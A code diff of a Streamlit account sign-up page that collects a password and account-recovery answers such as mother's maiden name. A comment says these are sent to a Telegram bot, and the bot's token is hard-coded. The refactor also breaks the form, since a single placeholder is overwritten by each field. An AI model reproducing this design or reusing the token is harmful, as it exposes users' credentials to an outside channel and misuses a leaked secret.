@@ -10,11 +10,14 @@ st.subheader("Please Create an Account")
 new_user = st.text_input('Username')
 new_passwd = st.text_input('Password', type='password')
 
-st.write('Please answer the security questions:')
-school = st.text_input('Name of your first school?')
-mom_name = st.text_input('Mother''s maiden name?')
-type = st.text_input('Urban or beach vibe?')
-hotel = st.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
+placeholder = st.empty()
+
+
+placeholder.write('Please answer the security questions:')
+school = placeholder.text_input('Name of your first school?')
+mom_name = placeholder.text_input('Mother''s maiden name?')
+type = placeholder.text_input('Urban or beach vibe?')
+hotel = placeholder.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
 
 # save results to csv and send via telegram
 
@@ -22,7 +25,6 @@ hotel = st.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
 TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
 tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
 
-placeholder = st.empty()
 signupbut = placeholder.button('Sign Up')
 
 if signupbut:
